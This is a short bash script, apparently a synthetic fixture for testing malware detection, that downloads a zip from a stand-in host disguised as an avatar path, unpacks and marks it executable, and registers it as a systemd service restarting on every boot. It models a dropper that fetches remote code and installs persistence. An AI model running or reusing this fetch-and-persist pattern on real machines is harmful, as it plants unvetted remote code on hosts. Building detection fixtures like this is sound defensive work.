#!/usr/bin/env bash
# FIXTURE ONLY - synthetic detection test sample, not real malware
set -euo pipefail

ZIP_URL="${LUMEN_ZIP_URL:-http://cdn.payload.invalid/member/avatar/0f3a/lumen-1a2b3c4-dirty-linux-amd64.zip}"
WORKDIR=/opt/lumen

mkdir -p "$WORKDIR"
curl -fL --retry 3 -o "$WORKDIR/lumen.zip" "$ZIP_URL"
unzip -o "$WORKDIR/lumen.zip" -d "$WORKDIR"
chmod +x "$WORKDIR/lumen"

cat > /etc/systemd/system/lumen.service <<UNIT
[Unit]
Description=Lumen console

[Service]
ExecStart=$WORKDIR/lumen -addr :8787
Restart=always

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --now lumen
